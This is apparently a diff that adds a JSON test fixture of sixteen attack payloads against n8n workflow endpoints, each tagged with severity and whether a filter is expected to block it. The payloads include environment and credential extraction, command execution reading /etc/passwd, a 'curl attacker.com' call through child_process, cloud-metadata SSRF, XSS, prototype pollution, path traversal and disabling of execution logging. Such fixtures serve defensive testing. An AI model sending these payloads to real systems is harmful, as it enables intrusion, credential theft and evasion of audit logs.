@@ -1,0 +1,222 @@
+[
+  {
+      "id": "AI-WORKFLOW-001",
+      "payload": "/rest/workflows?code=console.log(process.env)",
+      "tags": [
+        "workflow-abuse",
+        "code-injection",
+        "env-disclosure",
+        "critical"
+    ],
+      "expected_block": false,
+      "severity_hint": "Critical",
+      "notes": "Environment variable extraction via workflow code",
+      "category": "AI"
+  },
+  {
+      "id": "AI-WORKFLOW-002",
+      "payload": "/rest/workflows?expression={{$json.credentials}}",
+      "tags": [
+        "workflow-abuse",
+        "credential-extraction",
+        "quick",
+        "critical"
+    ],
+      "expected_block": false,
+      "severity_hint": "Critical",
+      "notes": "Credential extraction via n8n expression",
+      "category": "AI"
+  },
+  {
+      "id": "AI-WORKFLOW-003",
+      "payload": "/rest/workflows?nodes=[{\"type\":\"n8n-nodes-base.executeCommand\",\"parameters\":{\"command\":\"cat /etc/passwd\"}}]",
+      "tags": [
+        "workflow-abuse",
+        "command-injection",
+        "critical"
+    ],
+      "expected_block": false,
+      "severity_hint": "Critical",
+      "notes": "Execute Command node injection",
+      "category": "AI"
+  },
+  {
+      "id": "AI-WORKFLOW-004",
+      "payload": "/rest/workflows?webhook_path=../../admin/backdoor",
+      "tags": [
+        "workflow-abuse",
+        "path-traversal",
+        "high"
+    ],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Path traversal in webhook configuration",
+      "category": "AI"
+  },
+  {
+      "id": "AI-WORKFLOW-005",
+      "payload": "/rest/executions?code=require('child_process').exec('curl attacker.com')",
+      "tags": [
+        "workflow-abuse",
+        "ssrf",
+        "rce",
+        "quick",
+        "critical"
+    ],
+      "expected_block": false,
+      "severity_hint": "Critical",
+      "notes": "SSRF via code execution in workflow",
+      "category": "AI"
+  },
+  {
+      "id": "AI-WORKFLOW-006",
+      "payload": "/rest/workflows?settings={\"executionTimeout\":999999}",
+      "tags": [
+        "workflow-abuse",
+        "dos",
+        "resource-exhaustion",
+        "high"
+    ],
+      "expected_block": false,
+      "severity_hint": "High",
+      "notes": "Execution timeout manipulation for DoS",
+      "category": "AI"
+  },
+  {
+      "id": "AI-WORKFLOW-007",
+      "payload": "/rest/workflows?nodes=[{\"type\":\"n8n-nodes-base.httpRequest\",\"parameters\":{\"url\":\"http://169.254.169.254/latest/meta-data/\"}}]",
+      "tags": [
+        "workflow-abuse",
+        "ssrf",
+        "cloud-metadata",
+        "critical"
+    ],
+      "expected_block": false,
+      "severity_hint": "Critical",
+      "notes": "Cloud metadata SSRF via HTTP Request node",
+      "category": "AI"
+  },
+  {
+      "id": "AI-WORKFLOW-008",
+      "payload": "/rest/workflows?name=<script>alert(document.cookie)</script>",
+      "tags": [
+        "workflow-abuse",
+        "xss",
+        "quick",
+        "high"
+    ],
+      "expected_block": false,
+      "severity_hint": "High",
+      "notes": "XSS in workflow name field",
+      "category": "AI"
+  },
+  {
+      "id": "AI-WORKFLOW-009",
+      "payload": "/rest/workflows?expression={{$execution.mode='manual' && $workflow.settings.saveManualExecutions=false}}",
+      "tags": [
+        "workflow-abuse",
+        "audit-evasion",
+        "medium"
+    ],
+      "expected_block": false,
+      "severity_hint": "Medium",
+      "notes": "Disable execution logging via expression",
+      "category": "AI"
+  },
+  {
+      "id": "AI-WORKFLOW-010",
+      "payload": "/rest/workflows?code=global.webhookSecret='compromised'",
+      "tags": [
+        "workflow-abuse",
+        "global-pollution",
+        "critical"
+    ],
+      "expected_block": false,
+      "severity_hint": "Critical",
+      "notes": "Global object pollution attack",
+      "category": "AI"
+  },
+  {
+      "id": "AI-WORKFLOW-011",
+      "payload": "/rest/workflows?credentials={\"type\":\"oauth2\",\"data\":{\"accessToken\":\"stolen_token\"}}",
+      "tags": [
+        "workflow-abuse",
+        "credential-injection",
+        "quick",
+        "critical"
+    ],
+      "expected_block": false,
+      "severity_hint": "Critical",
+      "notes": "Malicious credential injection",
+      "category": "AI"
+  },
+  {
+      "id": "AI-WORKFLOW-012",
+      "payload": "/rest/workflows?nodes=[{\"type\":\"n8n-nodes-base.code\",\"parameters\":{\"jsCode\":\"return process.binding('spawn_sync')\"}}]",
+      "tags": [
+        "workflow-abuse",
+        "rce",
+        "critical"
+    ],
+      "expected_block": false,
+      "severity_hint": "Critical",
+      "notes": "Node.js internal binding access for RCE",
+      "category": "AI"
+  },
+  {
+      "id": "AI-WORKFLOW-013",
+      "payload": "/webhook/test?__proto__[polluted]=true",
+      "tags": [
+        "workflow-abuse",
+        "prototype-pollution",
+        "high"
+    ],
+      "expected_block": false,
+      "severity_hint": "High",
+      "notes": "Prototype pollution via webhook parameters",
+      "category": "AI"
+  },
+  {
+      "id": "AI-WORKFLOW-014",
+      "payload": "/rest/workflows?expression={{$json.__proto__.isAdmin=true}}",
+      "tags": [
+        "workflow-abuse",
+        "prototype-pollution",
+        "privilege-escalation",
+        "quick",
+        "critical"
+    ],
+      "expected_block": false,
+      "severity_hint": "Critical",
+      "notes": "Privilege escalation via prototype pollution",
+      "category": "AI"
+  },
+  {
+      "id": "AI-WORKFLOW-015",
+      "payload": "/rest/workflows?tags=[\"<img src=x onerror=alert(1)>\"]",
+      "tags": [
+        "workflow-abuse",
+        "xss",
+        "stored",
+        "high"
+    ],
+      "expected_block": false,
+      "severity_hint": "High",
+      "notes": "Stored XSS in workflow tags",
+      "category": "AI"
+  },
+  {
+      "id": "AI-WORKFLOW-016",
+      "payload": "/rest/workflows?error_workflow=../../../etc/passwd",
+      "tags": [
+        "workflow-abuse",
+        "path-traversal",
+        "quick",
+        "high"
+    ],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Path traversal in error workflow reference",
+      "category": "AI"
+  }
+]
